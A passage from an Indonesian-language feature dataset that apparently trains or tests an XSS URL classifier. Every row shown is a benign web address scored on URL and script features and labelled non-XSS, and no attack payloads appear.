Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://math.sun.ac.za/~prodinger/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://math.ucsd.edu/~driver/231-02-03/lecture_notes.htm;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://math.usask.ca/fvk/Valth.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://mathworld.wolfram.com/topics/NumberTheory.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://md5.my-addr.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://members.tripod.com/FootlightNotes/index.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://minnesotaplaylist.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://muse.jhu.edu/journals/theatre_topics/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://nase.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://numbers.computation.free.fr/Constants/Miscellaneous/bernoulli.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://nytheaterscene.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://oeis.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://orionrobots.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://peace.fresno.edu/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://people.revoledu.com/kardi/tutorial/kMean/index.html;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://plato.stanford.edu/entries/logic-classical/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://practical-management.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://probability.infarom.ro/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://professional-edu.blogspot.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://projects.exeter.ac.uk/RDavies/arian/scandals/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://r144.com/freelancejobsnews.htm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://robonyp.8m.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://robots.net/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://robots.net/rss/articles.xml;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://satirist.org/learn-game/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://science.nasa.gov/newhome/headlines/ast28may99_1.htm;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://sigact.acm.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://sigart.acm.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://staff.spd.dcu.ie/johnbcos/transcendental_numbers.htm;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://tata.gforge.inria.fr/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://telerobot.mech.uwa.edu.au/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://thedailymba.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://thewickedstage.blogspot.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://torontostage.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://truman.huji.ac.il/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://undergroundtrader.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://users.skynet.be/wivani/lp/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://vr.isdale.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://web.media.mit.edu/~lieber/PBE/index.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://web2.airmail.net/ktrig246/out_of_cave/mf.html;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://workmorale.blogspot.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.12manage.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.1dsc.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.aatac.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.abcr.de/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.acura.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.agstar.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.aim.com.au/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.aimresearch.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.aislesay.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.alessandragraziottin.com/index.php?langCode=en;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.algosort.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.alhansen.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.alpertron.com.ar/NUMBERT.HTM;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.amsta.leeds.ac.uk/Applied/CAGD.dir/PRIDE/index.htm;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.androidworld.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.appliedprobability.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.arkem.com.tr/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.ascmi.net/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.astonmartin.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.audi.co.nz/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.australianstage.com.au/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.autoalliance.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.autofacts.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.automotivecomposites.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.automotive-technology.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.backstage.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.bluffton.edu/lionlamb/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.bmw.co.uk/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.bnt-chemicals.de/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.boyceequipment.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.brad.ac.uk/peace/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.broadway.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.broadwaystars.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.broadwayworld.com/photogame.cfm;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.buick.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.businessmate.org/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.buyya.com/cluster;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cadillac.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cbiz.com/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cecm.sfu.ca/~loki/Papers/Numbers/;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;non-XSS\r\nhttp://www.cecm.sfu.ca/~mjm/Lehmer/lc.html;Kurang dari 54;Tidak 